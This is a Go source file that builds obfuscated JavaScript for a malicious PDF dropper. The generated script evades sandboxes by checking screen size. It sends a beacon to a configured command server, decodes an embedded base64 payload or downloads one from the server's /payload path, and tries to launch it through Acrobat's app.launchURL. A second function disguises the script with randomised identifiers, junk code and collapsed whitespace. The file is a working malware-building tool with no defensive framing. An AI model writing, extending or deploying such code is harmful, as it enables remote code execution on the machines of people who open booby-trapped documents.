package pdf

import (
	"encoding/base64"
	"strings"
)

type JSConfig struct {
	Server    string
	Payload   []byte
	StegoData []byte
	UseStego  bool
	Sandbox   bool
}

func GenerateJS(cfg JSConfig) string {
	payloadB64 := base64.StdEncoding.EncodeToString(cfg.Payload)

	js := `
(function() {
    function isSandboxed() {
        try {
            if (screen.width < 1024 || screen.height < 768) return true;
        } catch(e) { return true; }
        return false;
    }

    function beacon(url) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
            xhr.send('alive');
        } catch(e) {}
    }

    function fetchPayload(url) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, false);
            xhr.send();
            return new Uint8Array(xhr.response);
        } catch(e) { return null; }
    }

    function executePayload(data) {
        try {
            var blob = new Blob([data], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            if (typeof app !== 'undefined' && app.launchURL) {
                app.launchURL(url, true);
            }
        } catch(e) {}
    }

    try {
        if (isSandboxed()) {
            setTimeout(function(){}, 60000);
            return;
        }

        beacon('` + cfg.Server + `/beacon');

        var payloadData = null;
        var embeddedB64 = '` + payloadB64 + `';
        if (embeddedB64.length > 0) {
            var binary = atob(embeddedB64);
            payloadData = new Uint8Array(binary.length);
            for (var i = 0; i < binary.length; i++) {
                payloadData[i] = binary.charCodeAt(i);
            }
        }

        if (!payloadData || payloadData.length === 0) {
            var fetched = fetchPayload('` + cfg.Server + `/payload');
            if (fetched && fetched.length > 0) {
                payloadData = fetched;
            }
        }

        if (payloadData && payloadData.length > 0) {
            executePayload(payloadData);
        }
    } catch(e) {}
})();
`
	return obfuscateJS(js)
}

func obfuscateJS(js string) string {
	lines := strings.Split(js, "\n")
	var clean []string
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "//") {
			continue
		}
		clean = append(clean, line)
	}
	js = strings.Join(clean, "\n")

	replacements := map[string]string{
		"isSandboxed":   "_0x" + randomString(4),
		"beacon":        "_0x" + randomString(4),
		"fetchPayload":  "_0x" + randomString(4),
		"executePayload": "_0x" + randomString(4),
	}
	for old, new := range replacements {
		js = strings.ReplaceAll(js, old, new)
	}

	junk := `function ` + randomString(8) + `(){var a=0;for(var i=0;i<100;i++){a+=i;}return a;}`
	js = junk + "\n" + js
	js = strings.ReplaceAll(js, "\n", "")
	js = strings.ReplaceAll(js, "  ", " ")
	return js
}